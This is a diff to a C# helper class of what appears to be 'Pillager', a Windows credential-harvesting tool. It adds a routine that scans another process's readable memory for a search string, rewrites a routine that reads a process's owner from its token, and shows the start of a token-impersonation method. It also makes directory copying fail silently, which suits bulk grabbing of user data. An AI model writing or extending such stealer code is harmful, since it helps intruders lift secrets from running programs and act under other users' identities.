@@ -1,17 +1,123 @@
 ﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Management;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Text;
 
 namespace Pillager.Helper
 {
     internal class Methods
     {
+        internal static uint MEM_COMMIT = 0x1000;
+        internal static uint PAGE_READONLY = 0x02;
+        internal static uint PAGE_READWRITE = 0x04;
+        internal static uint PAGE_EXECUTE = 0x10;
+        internal static uint PAGE_EXECUTE_READ = 0x20;
+        public static List<long> SearchProcess(Process process, string searchString)
+        {
+            List<long> addrList = new List<long>();
+
+            if (IntPtr.Size == 8)
+            {
+                IntPtr minAddress = IntPtr.Zero;
+                IntPtr maxAddress = new IntPtr(2147483647);
+
+                while (minAddress.ToInt64() < maxAddress.ToInt64())
+                {
+                    int result;
+                    Native.MEMORY_BASIC_INFORMATION64 memInfo;
+                    result = Native.VirtualQueryEx64(process.Handle, minAddress, out memInfo, (uint)Marshal.SizeOf(typeof(Native.MEMORY_BASIC_INFORMATION64)));
+                    if (memInfo.State == MEM_COMMIT && (memInfo.Protect == PAGE_EXECUTE || memInfo.Protect == PAGE_EXECUTE_READ || memInfo.Protect == PAGE_EXECUTE_READ || memInfo.Protect == PAGE_READWRITE || memInfo.Protect == PAGE_READONLY))
+                    {
+                        byte[] buffer = new byte[(long)memInfo.RegionSize];
+                        bool success = Native.ReadProcessMemory(process.Handle, memInfo.BaseAddress, buffer, buffer.Length, out _);
+
+                        if (success)
+                        {
+                            byte[] search = Encoding.ASCII.GetBytes(searchString);
+                            for (int i = 0; i < buffer.Length - 8; i++)
+                            {
+                                if (buffer[i] == search[0])
+                                {
+                                    for (int s = 1; s < search.Length; s++)
+                                    {
+                                        if (buffer[i + s] != search[s])
+                                            break;
+                                        if (s == search.Length - 1)
+                                        {
+                                            addrList.Add((long)memInfo.BaseAddress + i);
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    minAddress = new IntPtr(memInfo.BaseAddress.ToInt64() + (long)memInfo.RegionSize);
+
+                    if (result == 0)
+                    {
+                        break;
+                    }
+
+
+                }
+            }
+            else
+            {
+                long minAddress = 0;
+                long maxAddress = 2147483647;
+
+                while (minAddress < maxAddress)
+                {
+                    Native.MEMORY_BASIC_INFORMATION32 memInfo;
+                    int result = Native.VirtualQueryEx32(process.Handle, (IntPtr)minAddress, out memInfo, (uint)Marshal.SizeOf(typeof(Native.MEMORY_BASIC_INFORMATION32)));
+
+                    if (result == 0)
+                    {
+                        break;
+                    }
+
+                    if (memInfo.State == MEM_COMMIT && (memInfo.Protect == PAGE_EXECUTE || memInfo.Protect == PAGE_EXECUTE_READ || memInfo.Protect == PAGE_EXECUTE_READ || memInfo.Protect == PAGE_READWRITE || memInfo.Protect == PAGE_READONLY))
+                    {
+                        byte[] buffer = new byte[memInfo.RegionSize];
+                        bool success = Native.ReadProcessMemory(process.Handle, (IntPtr)memInfo.BaseAddress, buffer, buffer.Length, out _);
+
+                        if (success)
+                        {
+                            byte[] search = Encoding.ASCII.GetBytes(searchString);
+                            for (int i = 0; i < buffer.Length - 8; i++)
+                            {
+                                if (buffer[i] == search[0])
+                                {
+                                    for (int s = 1; s < search.Length; s++)
+                                    {
+                                        if (buffer[i + s] != search[s])
+                                            break;
+                                        if (s == search.Length - 1)
+                                        {
+                                            addrList.Add(memInfo.BaseAddress + i);
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    minAddress = (uint)(memInfo.BaseAddress + memInfo.RegionSize);
+                }
+            }
+
+            return addrList;
+        }
+
         public static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
         {
             var dir = new DirectoryInfo(sourceDir);
 
             if (!dir.Exists)
-                throw new DirectoryNotFoundException($"Source directory not found: {dir.FullName}");
+                return;
 
             DirectoryInfo[] dirs = dir.GetDirectories();
             Directory.CreateDirectory(destinationDir);
@@ -20,7 +126,7 @@ namespace Pillager.Helper
                 string targetFilePath = Path.Combine(destinationDir, file.Name);
                 try
                 {
-                    File.WriteAllBytes(targetFilePath, File.ReadAllBytes(file.FullName));
+                    File.Copy(file.FullName, targetFilePath, true );
                 }
                 catch
                 {
@@ -42,28 +148,23 @@ namespace Pillager.Helper
             }
         }
 
-        public static string GetProcessUserName(int pID)
+        public static string GetProcessUserName(Process process)
         {
-            string text1 = null;
-            SelectQuery query1 = new SelectQuery("Select * from Win32_Process WHERE processID=" + pID);
-            ManagementObjectSearcher searcher1 = new ManagementObjectSearcher(query1);
+            var processHandle = IntPtr.Zero;
             try
             {
-                foreach (ManagementObject disk in searcher1.Get())
-                {
-                    ManagementBaseObject inPar = null;
-                    ManagementBaseObject outPar = null;
-                    inPar = disk.GetMethodParameters("GetOwner");
-                    outPar = disk.InvokeMethod("GetOwner", inPar, null);
-                    text1 = outPar["User"].ToString();
-                    break;
-                }
+                Native.OpenProcessToken(process.Handle, 8, out processHandle);
+                var wi = new WindowsIdentity(processHandle);
+                return wi.Name;
             }
             catch
             {
-                text1 = "SYSTEM";
+                return "";
             }
-            return text1;
+            finally
+            {
+                if (processHandle != IntPtr.Zero) Native.CloseHandle(processHandle);
+            }
         }
 
         public static bool ImpersonateProcessToken(int pid)
